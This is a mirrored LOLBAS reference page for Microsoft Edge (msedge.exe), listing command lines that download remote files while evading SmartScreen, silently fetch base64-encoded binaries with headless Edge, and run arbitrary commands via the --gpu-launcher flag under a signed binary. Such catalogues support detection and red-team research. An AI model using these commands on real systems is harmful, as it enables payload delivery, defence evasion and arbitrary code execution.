# LOLBAS: Msedge.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`, `Execute`

Microsoft Edge browser

## Comandos

### Download file from the internet

Download · priv: User · T1105

```cmd
msedge.exe {REMOTEURL:.exe.txt}
```

Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.

### Download file from the internet

Download · priv: User · T1105

```cmd
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
```

Edge will silently download the file. File extension should be .html and binaries should be encoded.

### Executes a process under a trusted Microsoft signed binary

Execute · priv: User · T1218.015

```cmd
msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command

